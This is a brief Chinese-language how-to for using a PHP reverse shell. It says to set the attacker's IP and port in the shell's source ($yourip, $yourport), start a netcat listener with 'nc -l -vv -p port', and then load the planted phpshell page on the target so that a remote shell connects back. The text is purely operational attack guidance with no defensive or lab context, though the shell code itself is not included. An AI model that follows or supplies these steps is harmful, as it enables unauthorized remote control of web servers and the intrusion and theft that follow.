PHP反弹用法

先本地执行

先修改好源码中的

$yourip = "your IP";
$yourport = 'your port';

然后
nc -l -vv -p port(端口)

然后访问phpshell即可返回